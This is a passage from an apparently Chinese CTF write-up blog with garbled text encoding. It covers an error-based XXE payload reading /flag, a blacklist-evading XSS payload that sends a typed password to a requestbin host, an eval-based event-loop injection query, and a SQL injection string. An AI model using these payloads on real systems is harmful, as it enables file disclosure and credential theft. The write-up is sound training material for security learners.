&amp;#x27;file:&#x2F;&#x2F;&#x2F;aaaaa&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;    &amp;#x25;eval;    &amp;#x25;error;&#39;&gt;%local_dtd;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE message [    &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#39;        &lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;        &lt;!ENTITY % eval &quot;&lt;!ENTITY % error SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;jlan&#x2F;%file;&#39;&gt;&quot;&gt;        %eval;        %error;    &#39;&gt;    %local_dtd;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2><p>æœ‰åé¦ˆï¼Œåˆç†æ€€ç–‘XSS</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$feedback</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('åé¦ˆä¸åˆæ³•');&lt;/script>"</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'#'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'script'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'iframe'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'onload'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'onerror'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'srcdoc'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'location'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'svg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'form'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'src'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'getElement'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'document'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$feedback</span><span class="token punctuation">,</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$feedback</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$feedback</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€ payload</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>incookieput type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"username"</span><span class="token operator">></span><span class="token operator">&lt;</span>incookieput type<span class="token operator">=</span><span class="token string">"password"</span> name<span class="token operator">=</span><span class="token string">"password"</span><span class="token operator">></span><span class="token operator">&lt;</span>scrcookieipt scookierc<span class="token operator">=</span><span class="token string">"./js/login.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>scrcookieipt<span class="token operator">></span><span class="token operator">&lt;</span>scrcookieipt<span class="token operator">></span>    <span class="token keyword">var</span> psw <span class="token operator">=</span> docucookiement<span class="token punctuation">.</span><span class="token function">getcookieElementsByName</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    docucookiement<span class="token punctuation">.</span>locacookietion<span class="token operator">=</span><span class="token string">"http://http.requestbin.buuoj.cn/1is06vp1/?a="</span><span class="token operator">+</span>psw<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>scrcookieipt<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><p>æ¬£èµæºç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span>url_prefix <span class="token operator">=</span> <span class="token string">'/d5afe1f66147e857'</span><span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span><span class="token keyword">def</span> <span class="token function">trigger_event</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">+=</span> event    <span class="token keyword">else</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_mid_str</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> postfix<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> postfix <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span><span class="token punctuation">:</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> haystack<span class="token keyword">class</span> <span class="token class-name">RollBackException</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">execute_event_loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    valid_event_chars <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>        <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span><span class="token punctuation">)</span>    resp <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>event_queue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span>        event <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> event<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">,</span> <span class="token string">'func:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> event<span class="token punctuation">:</span>            <span class="token keyword">if</span> c <span class="token keyword">not</span> <span class="token keyword">in</span> valid_event_chars<span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            is_action <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'a'</span>            action <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">)</span>            args <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> action<span class="token operator">+</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                event_handler <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>                    action <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'_handler'</span> <span class="token keyword">if</span> is_action <span class="token keyword">else</span> <span class="token string">'_function'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                ret_val <span class="token operator">=</span> event_handler<span class="token punctuation">(</span>args<span class="token punctuation">)</span>            <span class="token keyword">except</span> RollBackException<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                resp <span class="token operator">+=</span> <span class="token string">'ERROR! All transactions have been cancelled. &lt;br />'</span>                resp <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>                session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>                session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                <span class="token comment"># resp += str(e) # only for debugging</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> ret_val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> ret_val                <span class="token keyword">else</span><span class="token punctuation">:</span>                    resp <span class="token operator">+=</span> ret_val    <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> resp <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'404 NOT FOUND'</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span>    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> resp<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">entry_point</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    querystring <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_string<span class="token punctuation">)</span>    request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> querystring <span class="token operator">==</span> <span class="token string">''</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token keyword">not</span> querystring<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>querystring<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>        querystring <span class="token operator">=</span> <span class="token string">'action:index;False#False'</span>    <span class="token keyword">if</span> <span class="token string">'num_items'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    request<span class="token punctuation">.</span>prev_session <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span>querystring<span class="token punctuation">)</span>    <span class="token keyword">return</span> execute_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># handlers/functions below --------------------------------------</span><span class="token keyword">def</span> <span class="token function">view_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    page <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    html <span class="token operator">=</span> <span class="token string">''</span>    html <span class="token operator">+=</span> <span class="token string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> page <span class="token operator">==</span> <span class="token string">'index'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23False">View source code&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;shop">Go to e-shop&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;reset">Reset&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'shop'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:buy;1">Buy a diamond (1 point)&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'reset'</span><span class="token punctuation">:</span>        <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>        html <span class="token operator">+=</span> <span class="token string">'Session reset.&lt;br />'</span>    html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>    <span class="token keyword">return</span> html<span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    bool_show_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    bool_download_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> bool_show_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>        source <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'eventLoop.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>        html <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23True">Download this .py file&lt;/a>&lt;br />'</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>            <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>                    <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line        source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=serve.py'</span>            <span class="token keyword">return</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> html    <span class="token keyword">else</span><span class="token punctuation">:</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#å¢åŠ num_items</span>    num_items <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> num_items <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> num_items    trigger_event<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'func:consume_point;&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        num_items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'action:view;index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">consume_point_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    point_to_consume <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> point_to_consume<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RollBackException<span class="token punctuation">(</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">-=</span> point_to_consume<span class="token keyword">def</span> <span class="token function">show_flag_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span>    <span class="token keyword">return</span> <span class="token string">'You naughty boy! ;) &lt;br />'</span><span class="token keyword">def</span> <span class="token function">get_flag_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#æœ€ç»ˆæ‹¿flag</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token comment"># show_flag_function has been disabled, no worries</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'func:show_flag;'</span> <span class="token operator">+</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹æºç ä¸­å„ä¸ªå‡½æ•°çš„åŠŸèƒ½ï¼Œå†™åˆ°æ³¨é‡Šä¸­äº†ï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœéœ€è¦æ‹¿flagå°±è¦è°ƒç”¨<code>get_flag_handler</code>ï¼Œè€Œå¦‚æœè¦æ‰§è¡Œå°±éœ€è¦æœ‰5ä¸ª<code>num_items</code>ï¼Œé€šè¿‡<code>buy_handler</code>å‡½æ•°æ¥å¢åŠ <code>num_items</code>ï¼Œä½†æ˜¯é’±ä¸å¤Ÿï¼Œæ­¤æ—¶æˆ‘ä»¬é€šè¿‡æ‰§è¡Œ<code>trigger_event</code>å‡½æ•°æ¥è¿›è¡Œå¤šå‡½æ•°æ‰§è¡Œï¼Œåœ¨è¿›è¡Œæ‰£è´¹ä¹‹å‰å°±æ‹¿å–åˆ°flag</p><pre class="line-numbers language-none"><code class="language-none">?action:trigger_event#;action:buy;5#action:get_flag;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­¤æ—¶sessionå·²ç»è¢«å†™å…¥cookieäº†ï¼Œç”±äºè¯¥flaskç¨‹åºä¸­å¹¶æ²¡æœ‰ä½¿ç”¨æ•°æ®åº“ï¼Œæ‰€ä»¥sessionä¸­çš„å†…å®¹å®é™…ä¸Šæ˜¯å‚¨å­˜åœ¨æˆ‘ä»¬çš„cookieä¸­ï¼ˆ<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">æˆ³è¿™é‡Œçœ‹è¯¦æƒ…</a>ï¼‰å¾—åˆ°sessionå†…å®¹å¹¶ä½¿ç”¨<code>flask-session-cookie-manager</code>å·¥å…·è¿›è¡Œè§£å¯†ï¼Œæ‹¿åˆ°flag</p><h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p>SQLæ³¨å…¥ï¼Œè¿‡æ»¤å·²æé†’<code>UNION SLEEP &#39; &quot; OR - BENCHMARK</code></p><p>å…ˆç”¨order byæµ‹å‡ºåˆ—æ•°ï¼Œå†ç”¨ä¸‡èƒ½å¯†ç æå‡ºflag</p><pre class="line-numbers language-none"><code class="language-none">1 || 1&#x3D;1 limit 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2><p>æºç å…ˆæ‰”</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token 